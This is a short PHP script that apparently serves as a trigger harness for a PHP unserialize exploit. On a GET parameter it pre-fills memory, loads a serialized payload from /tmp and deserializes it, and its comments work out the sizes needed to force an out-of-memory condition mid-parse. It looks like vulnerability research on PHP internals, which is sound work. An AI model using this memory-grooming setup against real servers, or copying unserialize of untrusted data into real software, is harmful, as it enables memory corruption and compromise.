<?php
error_reporting(E_ALL);
ini_set("display_errors", "1");

if (isset($_GET["arm8"])) {
    $pad = str_repeat("B", 2 * 1024 * 1024);  // 2MB pre-fill
    $payload = file_get_contents("/tmp/arm8.ser");  // ~2MB → total ~4MB
    // Payload has: object (parses fine) then s:2000000:"..." (needs 2MB alloc)
    // 4MB + 2MB = 6MB pre-OOM; alloc of 2MB zend_string pushes to 8MB → OOM
    @unserialize($payload);
    echo "arm8_unreachable\n";
    exit;
}
echo "idle\n";
